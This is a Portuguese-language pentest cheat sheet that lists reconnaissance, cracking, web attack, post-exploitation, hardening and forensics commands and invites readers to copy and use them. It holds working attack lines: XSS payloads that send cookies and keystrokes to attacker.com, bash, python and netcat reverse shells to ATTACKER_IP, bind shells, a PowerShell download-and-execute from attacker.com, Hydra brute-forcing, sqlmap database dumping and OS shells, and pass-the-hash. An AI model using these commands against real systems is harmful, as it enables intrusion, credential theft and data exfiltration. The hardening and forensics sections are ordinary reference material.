# 🔐 Comandos de Cybersegurança

> Todos os comandos essenciais para pentest, defesa, forense e automação. Copie, cole, use.

---

## 📡 Reconhecimento e Enumeração

### DNS

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `nslookup` | Consultar DNS | `nslookup google.com` |
| `dig` | DNS detalhado | `dig @8.8.8.8 google.com` |
| `dig ANY` | Todos os registros | `dig google.com ANY` |
| `dig MX` | Registros de email | `dig gmail.com MX` |
| `dig NS` | Nameservers | `dig google.com NS` |
| `dig TXT` | Registros TXT | `dig google.com TXT` |
| `dig +trace` | Rastrear resolução | `dig +trace google.com` |
| `host` | DNS simples | `host google.com` |
| `dnsenum` | Enumeração DNS | `dnsenum --enum google.com` |
| `dnsrecon` | DNS recon profundo | `dnsrecon -d google.com` |
| ` fierce` | DNS brute force | `fierce --domain google.com` |
| `subfinder` | Subdomínios passivos | `subfinder -d google.com` |
| `amass` | Enumeração completa | `amass enum -d google.com` |

### Whois e Registro

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `whois` | Info de domínio | `whois google.com` |
| `whois IP` | Info de IP | `whois 8.8.8.8` |

### Port Scanning (Nmap)

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `nmap` | Scan básico | `nmap 192.168.1.1` |
| `nmap -sV` | Detectar versões | `nmap -sV 192.168.1.1` |
| `nmap -sC` | Scripts padrão | `nmap -sC 192.168.1.1` |
| `nmap -A` | Scan agressivo | `nmap -A 192.168.1.1` |
| `nmap -p-` | Todas as portas | `nmap -p- 192.168.1.1` |
| `nmap -p 80,443` | Portas específicas | `nmap -p 80,443 192.168.1.1` |
| `nmap -sU` | Scan UDP | `nmap -sU 192.168.1.1` |
| `nmap -sS` | TCP SYN scan | `nmap -sS 192.168.1.1` |
| `nmap -sT` | TCP connect | `nmap -sT 192.168.1.1` |
| `nmap -O` | Detectar OS | `nmap -O 192.168.1.1` |
| `nmap -sn` | Ping sweep | `nmap -sn 192.168.1.0/24` |
| `nmap --script` | Scripts NSE | `nmap --script vuln 192.168.1.1` |
| `nmap -oX` | Saída XML | `nmap -oX scan.xml 192.168.1.1` |
| `nmap -oN` | Saída normal | `nmap -oN scan.txt 192.168.1.1` |
| `nmap -T4` | Scan rápido | `nmap -T4 192.168.1.0/24` |
| `nmap -T5` | Scan mais rápido | `nmap -T5 192.168.1.0/24` |

#### Nmap Scripts Essenciais

```bash
# Vulnerabilidades
nmap --script vuln 192.168.1.1

# Web
nmap --script http-enum 192.168.1.1
nmap --script http-headers 192.168.1.1
nmap --script http-title 192.168.1.1
nmap --script http-robots.txt 192.168.1.1
nmap --script http-sql-injection 192.168.1.1

# SMB
nmap --script smb-enum-shares 192.168.1.1
nmap --script smb-enum-users 192.168.1.1
nmap --script smb-vuln-ms17-010 192.168.1.1

# SSH
nmap --script ssh-auth-methods 192.168.1.1
nmap --script ssh2-enum-algos 192.168.1.1

# FTP
nmap --script ftp-anon 192.168.1.1
nmap --script ftp-syst 192.168.1.1

# DNS
nmap --script dns-brute 192.168.1.1
nmap --script dns-zone-transfer 192.168.1.1

# SSL
nmap --script ssl-enum-ciphers 192.168.1.1
nmap --script ssl-heartbleed 192.168.1.1
```

### OSINT

| Comando/Ferramenta | O que faz | Exemplo |
|:--------|:----------|:--------|
| `theHarvester` | Emails e subdomínios | `theHarvester -d google.com -b google` |
| `sherlock` | Usuários em redes sociais | `sherlock usuario` |
| `spiderfoot` | OSINT automatizado | `spiderfoot -s 8.8.8.8` |
| `maltego` | Análise visual (GUI) | `maltego` |
| `recon-ng` | Framework OSINT | `recon-ng` |
| `shodan` | IoT e serviços | `shodan search "apache country:BR"` |
| `censys` | Certificados SSL | `censys search "google.com"` |

### Web Recon

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `whatweb` | Tecnologias | `whatweb google.com` |
| `wafw00f` | Detectar WAF | `wafw00f https://google.com` |
| `gobuster` | Dir brute force | `gobuster dir -u http://site -w wordlist.txt` |
| `ffuf` | Fuzzing web | `ffuf -u http://site/FUZZ -w wordlist.txt` |
| `nikto` | Scanner web | `nikto -h http://site.com` |
| `wpscan` | Scanner WordPress | `wpscan --url http://site.com` |
| `curl -I` | Headers HTTP | `curl -I https://google.com` |
| `curl -s` | Página silenciosa | `curl -s https://site.com \| grep title` |
| `httpx` | URLs ativas | `httpx -l urls.txt` |
| `nuclei` | Scanner vulnerabilidades | `nuclei -u http://site.com` |
| `katana` | Web crawler | `katana -u http://site.com` |

---

## 🔑 Brute Force e Cracking

### Hydra (Brute Force Login)

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `hydra SSH` | Brute force SSH | `hydra -l user -P wordlist.txt ssh://192.168.1.1` |
| `hydra FTP` | Brute force FTP | `hydra -l admin -P wordlist.txt ftp://192.168.1.1` |
| `hydra HTTP` | Brute force web | `hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=senha incorreta"` |
| `hydra RDP` | Brute force RDP | `hydra -l administrator -P wordlist.txt rdp://192.168.1.1` |
| `hydra SMB` | Brute force SMB | `hydra -l admin -P wordlist.txt smb://192.168.1.1` |
| `hydra MySQL` | Brute force MySQL | `hydra -l root -P wordlist.txt mysql://192.168.1.1` |
| `hydra -t 4` | Threads (lento) | `hydra -l user -P wordlist.txt -t 4 ssh://host` |
| `hydra -f` | Parar no primeiro | `hydra -l user -P wordlist.txt -f ssh://host` |
| `hydra -vV` | Verbose | `hydra -vV -l user -P wordlist.txt ssh://host` |

### John the Ripper (Cracking Hashes)

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `john hash.txt` | Crackear hashes | `john hashes.txt` |
| `john --wordlist=rockyou.txt` | Wordlist | `john --wordlist=rockyou.txt hashes.txt` |
| `john --show` | Mostrar cracks | `john --show hashes.txt` |
| `john --format=md5` | Formato específico | `john --format=md5 hashes.txt` |
| `john --list=formats` | Listar formatos | `john --list=formats` |
| `john --incremental` | Incremental | `john --incremental hashes.txt` |
| `john --single` | Single crack | `john --single hashes.txt` |

#### Hashcat (GPU Cracking)

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `hashcat -m 0` | MD5 | `hashcat -m 0 hash.txt rockyou.txt` |
| `hashcat -m 1000` | NTLM | `hashcat -m 1000 hash.txt rockyou.txt` |
| `hashcat -m 1400` | SHA256 | `hashcat -m 1400 hash.txt rockyou.txt` |
| `hashcat -m 1800` | sha512crypt | `hashcat -m 1800 hash.txt rockyou.txt` |
| `hashcat -m 3200` | bcrypt | `hashcat -m 3200 hash.txt rockyou.txt` |
| `hashcat -a 3` | Brute force | `hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a` |
| `hashcat --show` | Mostrar cracks | `hashcat --show hash.txt` |
| `hashcat -I` | Info GPU | `hashcat -I` |

#### hashid (Identificar Hash)

| Comando | O que faz |
|:--------|:----------|
| `hashid HASH` | Identificar tipo de hash |
| `hashid -f` | Formato john |
| `hashid -m` | Modo MCF |

---

## 🌐 Web Application Testing

### SQL Injection

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `sqlmap` | SQL injection auto | `sqlmap -u "http://site/?id=1"` |
| `sqlmap -dbs` | Listar bancos | `sqlmap -u "http://site/?id=1" --dbs` |
| `sqlmap -D db --tables` | Listar tabelas | `sqlmap -u "http://site/?id=1" -D mydb --tables` |
| `sqlmap -D db -T table --dump` | Dump dados | `sqlmap -u "http://site/?id=1" -D mydb -T users --dump` |
| `sqlmap -p param` | Parâmetro | `sqlmap -u "http://site/?id=1" -p id` |
| `sqlmap --forms` | Formulários | `sqlmap -u "http://site/" --forms` |
| `sqlmap --cookie` | Com cookie | `sqlmap -u "http://site/?id=1" --cookie="session=abc"` |
| `sqlmap --data` | POST | `sqlmap -u "http://site/login" --data="user=admin&pass=123"` |
| `sqlmap --level 5 --risk 3` | Nível máximo | `sqlmap -u "http://site/?id=1" --level 5 --risk 3` |
| `sqlmap --os-shell` | Shell OS | `sqlmap -u "http://site/?id=1" --os-shell` |
| `sqlmap --file-read` | Ler arquivo | `sqlmap -u "http://site/?id=1" --file-read="/etc/passwd"` |
| `sqlmap --batch` | Não perguntar | `sqlmap -u "http://site/?id=1" --batch` |
| `sqlmap --tor` | Via Tor | `sqlmap -u "http://site/?id=1" --tor` |
| `sqlmap -r req.txt` | De request | `sqlmap -r request.txt` |

### XSS (Cross-Site Scripting)

```bash
# Payloads básicos
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<body onload=alert('XSS')>

# Reflected XSS - URL
http://site.com/search?q=<script>alert('XSS')</script>

# Stored XSS - Formulário
<script>document.location='http://attacker.com/?c='+document.cookie</script>

# Cookie stealing
<script>new Image().src="http://attacker.com/?c="+document.cookie;</script>

# Keylogger
<script>document.onkeypress=function(e){new Image().src="http://attacker.com/?k="+e.key}</script>
```

### Burp Suite (Proxy)

```bash
# Iniciar Burp Suite
burpsuite

# Configurar proxy no browser
# Proxy → Options → Proxy Listeners → 127.0.0.1:8080

# Intercept
# Proxy → Intercept → Intercept is on

# Scanner
# Target → Scan → Start scan

# Intruder (brute force)
# Intruder → Positions → Set payload
```

---

## 🕵️ Sniffing e Análise de Rede

### Wireshark

```bash
# Iniciar (GUI)
wireshark

# Capturar na interface
tshark -i eth0

# Capturar e salvar
tshark -i eth0 -w capture.pcap

# Ler captura
tshark -r capture.pcap

# Filtrar por IP
tshark -r capture.pcap -Y "ip.addr == 192.168.1.1"

# Filtrar por porta
tshark -r capture.pcap -Y "tcp.port == 80"

# Filtrar por protocolo
tshark -r capture.pcap -Y "http"

# Estatísticas
tshark -r capture.pcap -q -z io,phs
```

### tcpdump

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `tcpdump` | Capturar pacotes | `sudo tcpdump -i eth0` |
| `tcpdump -w` | Salvar em arquivo | `sudo tcpdump -i eth0 -w capture.pcap` |
| `tcpdump -r` | Ler arquivo | `tcpdump -r capture.pcap` |
| `tcpdump host` | Filtrar host | `sudo tcpdump host 192.168.1.1` |
| `tcpdump port` | Filtrar porta | `sudo tcpdump port 80` |
| `tcpdump net` | Filtrar rede | `sudo tcpdump net 192.168.1.0/24` |
| `tcpdump -A` | Ver payloads | `sudo tcpdump -A port 80` |
| `tcpdump -X` | Hex + ASCII | `sudo tcpdump -X port 80` |
| `tcpdump -c 100` | 100 pacotes | `sudo tcpdump -c 100` |
| `tcpdump -n` | Sem resolver DNS | `sudo tcpdump -n` |
| `tcpdump 'tcp[tcpflags] & tcp-syn != 0'` | Só SYN | `sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0'` |

### Netcat

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `nc -l` | Listener | `nc -lvp 4444` |
| `nc -e` | Executar shell | `nc -lvp 4444 -e /bin/bash` |
| `nc -v` | Verbose | `nc -v 192.168.1.1 80` |
| `nc -z` | Scan portas | `nc -zv 192.168.1.1 1-1000` |
| `nc -u` | UDP | `nc -luv 4444` |
| `nc -w` | Timeout | `nc -w 3 192.168.1.1 80` |
| `nc file` | Transferir arquivo | `nc -lvp 4444 > arquivo` ( receptor ) / `nc 192.168.1.1 4444 < arquivo` ( emissor ) |

### Socat

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `socat` | Netcat avançado | `socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash` |
| `socat SSL` | Conexão SSL | `socat - TCP:192.168.1.1:4444,ssl` |
| `socat redirect` | Redirect de porta | `socat TCP-LISTEN:80,fork TCP:192.168.1.1:80` |

---

## 🔒 Proxy e Anonimato

### Proxychains

```bash
# Configurar /etc/proxychains4.conf
# tails nessa ordem: socks4 127.0.0.1 9050

# Usar com proxychains
proxychains nmap -sT 192.168.1.1
proxychains curl https://ipinfo.io
proxychains hydra -l user -P wordlist.txt ssh://target

# Forçar DNS
proxychains4 -f /etc/proxychains4.conf -q nmap -sT -p 80 target
```

### Tor

```bash
# Instalar
sudo apt install tor

# Iniciar
sudo systemctl start tor

# Status
sudo systemctl status tor

# Configurar proxychains para Tor
# /etc/proxychains4.conf → socks4 127.0.0.1 9050

# Ver IP via Tor
proxychains curl https://ipinfo.io
```

### Responder

```bash
# Capturar hashes NTLMv2
sudo responder -I eth0 -wrf

# Com Milton (hash crack)
sudo responder -I eth0 -wrf -v
```

### Bettercap (MITM)

```bash
# Iniciar
sudo bettercap -iface eth0

# Dentro do bettercap
net.probe on
net.show
arp.spoof on
dns.spoof on
net.sniff on
```

### mitmproxy

```bash
# Iniciar proxy interativo
mitmproxy

# Iniciar web interface
mitmweb

# Script
mitmproxy -s script.py
```

---

## 🔧 Pós-Exploração

### LinPEAS (Linux)

```bash
# Baixar e rodar
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Ou copiar para o alvo
scp linpeas.sh user@target:/tmp/
ssh user@target "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"
```

### WinPEAS (Windows)

```powershell
# Baixar e rodar
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/winpeas.ps1')"

# Ou copiar para o alvo
scp winpeas.exe user@target:C:\Users\Public\
```

### Escalação de Privilégios (Linux)

```bash
# Verificar SUID
find / -perm -4000 -type f 2>/dev/null

# Verificar sudo
sudo -l

# Kernel exploit
uname -a
searchsploit linux kernel 4.x

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Writable /etc/passwd
ls -la /etc/passwd

# Docker groups
id | grep docker
```

### Escalação de Privilégios (Windows)

```powershell
# Informações do sistema
systeminfo
whoami /all
ipconfig /all
net user
net localgroup administrators

# Serviços
sc query
wmic service list brief

# Programas instalados
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Senhas em arquivos
findstr /si "password" *.txt *.ini *.config
type C:\Unattend.xml
```

### Impacket (SMB/WMI)

```bash
# Listar shares
smbclient -L //192.168.1.1/ -U user

# Conectar share
smbclient //192.168.1.1/share -U user

# Executar comandos via WMI
wmiexec.py user:password@192.168.1.1 "whoami"

# Pass the Hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
```

### BloodHound (AD Analysis)

```bash
# Coletor SharpHound
SharpHound.exe -c All

# Importar no BloodHound
bloodhound-python -u user -p password -d domain.com -c All -ns 192.168.1.1
```

---

## 🛡️ Defesa e Hardening

### UFW (Uncomplicated Firewall)

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `ufw enable` | Ativar firewall | `sudo ufw enable` |
| `ufw disable` | Desativar | `sudo ufw disable` |
| `ufw status` | Ver regras | `sudo ufw status numbered` |
| `ufw allow` | Liberar porta | `sudo ufw allow 22/tcp` |
| `ufw deny` | Bloquear porta | `sudo ufw deny 80/tcp` |
| `ufw delete` | Remover regra | `sudo ufw delete 1` |
| `ufw allow from` | IP específico | `sudo ufw allow from 192.168.1.100` |
| `ufw logging` | Ativar logs | `sudo ufw logging on` |

### iptables

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `iptables -L` | Listar regras | `sudo iptables -L -n -v` |
| `iptables -A INPUT` | Adicionar regra | `sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT` |
| `iptables -D INPUT` | Deletar regra | `sudo iptables -D INPUT 1` |
| `iptables -F` | Limpar tudo | `sudo iptables -F` |
| `iptables -P INPUT DROP` | Policy padrão | `sudo iptables -P INPUT DROP` |

### SSH Hardening

```bash
# /etc/ssh/sshd_config
Port 2222                          # Porta não padrão
PermitRootLogin no                 # Não permitir root
PasswordAuthentication no          # Só chave pública
MaxAuthTries 3                     # Máximo 3 tentativas
ClientAliveInterval 300            # Timeout
ClientAliveCountMax 2              # Máximo timeouts
AllowUsers user1 user2             # Só esses usuários
Protocol 2                         # SSH v2 apenas

# Gerar chave SSH
ssh-keygen -t ed25519 -C "email@example.com"

# Copiar chave para servidor
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server
```

### Sysctl Hardening

```bash
# /etc/sysctl.conf

# Proteção contra IP spoofing
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Não responder a broadcasts
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Habilitar SYN cookies
net.ipv4.tcp_syncookies = 1

# Desabilitar IPv6 (se não usar)
net.ipv6.conf.all.disable_ipv6 = 1

# Proteção contra MITM
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0

# Aplicar
sudo sysctl -p
```

---

## 🔍 Forense Digital

### Análise de Disco

```bash
# Criar imagem forense
dd if=/dev/sda of=disco.img bs=4M status=progress

# Hash da imagem
md5sum disco.img
sha256sum disco.img

# Montar imagem
sudo mount -o loop,ro disco.img /mnt/evidence

# Listar arquivos
fls disco.img                     # Sleuth Kit
tsk_recover disco.img recovered/  # Recuperar arquivos
icat disco.img 12345              # Extrair arquivo por inode
```

### Análise de Memória (Volatility)

```bash
# Identificar OS
volatility -f mem.raw imageinfo

# Processos
volatility -f mem.raw --profile=Win7SP1x64 pslist
volatility -f mem.raw --profile=Win7SP1x64 pstree
volatility -f mem.raw --profile=Win7SP1x64 psxview

# Network
volatility -f mem.raw --profile=Win7SP1x64 netscan
volatility -f mem.raw --profile=Win7SP1x64 connections

# Arquivos
volatility -f mem.raw --profile=Win7SP1x64 filescan
volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -D output/

# Registros
volatility -f mem.raw --profile=Win7SP1x64 hivelist
volatility -f mem.raw --profile=Win7SP1x64 hashdump

# Cmd
volatility -f mem.raw --profile=Win7SP1x64 cmdscan
volatility -f mem.raw --profile=Win7SP1x64 consoles
```

### Análise de Malware

```bash
# Strings
strings malware.exe | grep -i "http"
strings malware.exe | grep -i "password"

# File info
file malware.exe
exiftool malware.exe

# Hashes
md5sum malware.exe
sha1sum malware.exe
sha256sum malware.exe

# VirusTotal
vt.exe malware.exe  # ou upload manual

# YARA
yara -r rules/ malware.exe

# Ghidra (GUI)
ghidraRun

# PE analysis
pecheck malware.exe
```

---

## 🔐 Criptografia

### OpenSSL

| Comando | O que faz | Exemplo |
|:--------|:----------|:--------|
| `openssl rand` | Gerar bytes aleatórios | `openssl rand -hex 16` |
| `openssl enc -aes-256-cbc` | Encriptar | `openssl enc -aes-256-cbc -salt -in arquivo.txt -out arquivo.enc` |
| `openssl enc -d` | Decriptar | `openssl enc -aes-256-cbc -d -in arquivo.enc -out arquivo.txt` |
| `openssl dgst` | Hash | `openssl dgst -sha256 arquivo.txt` |
| `openssl passwd` | Gerar senha | `openssl passwd -6` |
| `openssl req` | CSR | `openssl req -new -newkey rsa:2048 -nodes -keyout key.pem -out csr.pem` |
| `openssl x509` | Certificado | `openssl x509 -in cert.pem -text -noout` |
| `openssl s_client` | Testar TLS | `openssl s_client -connect site.com:443` |

### GPG (GNU Privacy Guard)

```bash
# Gerar chave
gpg --gen-key

# Listar chaves
gpg --list-keys
gpg --list-secret-keys

# Encriptar
gpg -e -r email@email.com arquivo.txt

# Decriptar
gpg -d arquivo.txt.gpg

# Assinar
gpg --sign arquivo.txt

# Verificar assinatura
gpg --verify arquivo.txt.gpg

# Exportar chave pública
gpg --export -a "Nome" > public.key

# Importar chave pública
gpg --import public.key
```

---

## 🐳 Docker (Segurança)

```bash
# Scan de imagem
docker scout cves imagem:latest
trivy image imagem:latest
grype imagem:latest

# Rodar sem root
docker run --user 1000:1000 imagem

# Rodar sem privilege
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE imagem

# Rodar read-only
docker run --read-only imagem

# Limitar recursos
docker run --memory=512m --cpus=1 imagem

# Ver containers rodando
docker ps
docker ps -a

# Logs
docker logs container_id
docker logs -f container_id

# Entrar no container
docker exec -it container_id /bin/bash

# Copiar arquivo
docker cp container_id:/path/file ./file
```

---

## ☸️ Kubernetes (Segurança)

```bash
# Pods rodando
kubectl get pods -A

# Descrever pod
kubectl describe pod pod_name

# Logs
kubectl logs pod_name
kubectl logs -f pod_name

# Executar comando
kubectl exec -it pod_name -- /bin/bash

# Port forward
kubectl port-forward pod_name 8080:80

# Secrets
kubectl get secrets
kubectl get secret secret_name -o yaml

# RBAC
kubectl get clusterrolebinding
kubectl get rolebinding -A

# Network Policies
kubectl get networkpolicies -A

# Scan de cluster
kube-hunter
kube-bench
```

---

## 🎯 One-Liners Úteis

### Recon

```bash
# Scan rápido da rede
nmap -sn 192.168.1.0/24 | grep "report for" | awk '{print $NF}'

# Portas abertas de um host
nmap -sT -p- --min-rate 5000 192.168.1.1 | grep "open"

# Subdomínios
subfinder -d target.com -silent | httpx -silent

# Tecnologias
whatweb -q target.com

# Senhas padrão
hydra -L users.txt -P passwords.txt ssh://192.168.1.1 -f -t 4
```

### Exploração

```bash
# Reverse shell bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Reverse shell python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Reverse shell netcat
nc -e /bin/bash ATTACKER_IP 4444

# Bind shell
nc -lvp 4444 -e /bin/bash

# Port forwarding
ssh -R 8080:localhost:80 user@attacker.com

# Socks proxy via SSH
ssh -D 1080 user@target.com
```

### Pós-Exploração

```bash
# Transferir arquivo para o alvo
python3 -m http.server 80  # No atacante
wget http://ATTACKER_IP/file  # No alvo

# Meterpreter
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
meterpreter > shell
meterpreter > portfwd add -l 3389 -p 3389 -r TARGET_IP
```

### Defesa

```bash
# Verificar IPs suspeitos no auth.log
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Processos suspeosos
ps aux | grep -E "(nc|ncat|netcat|socat|bash -i)" | grep -v grep

# Conexões estabelecidas
ss -tunp | grep ESTAB

# Arquivos modificados recentemente
find / -mtime -1 -type f 2>/dev/null | grep -v proc

# Cron jobs suspeitos
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# Verificar rootkits
chkrootkit
rkhunter --check
```

---

## 📦 Wordlists

```bash
# Localização do SecLists
/usr/share/seclists/

# Localização do rockyou
/usr/share/wordlists/rockyou.txt

# Gerar wordlist
crunch 8 8 -t @@@@%%%% -o wordlist.txt
cewl -d 3 -m 5 -w wordlist.txt https://target.com
```

---

## ✅ Checkpoint

- [ ] Consigo usar Nmap para scanear redes
- [ ] Consigo usar Hydra para brute force
- [ ] Consigo usar John/Hashcat para cracks
- [ ] Consigo usar sqlmap para SQL injection
- [ ] Consigo usar Wireshark/tcpdump para análise
- [ ] Consigo usar Netcat/Socat para conexões
- [ ] Consigo configurar proxies e Tor
- [ ] Consigo usar ferramentas de forense
- [ ] Consigo fazer hardening de servidores
- [ ] Consigo criar reverse shells

---

<div align="center">

**⬅️ [Voltar: Básico ao Avançado](README.md)**

</div>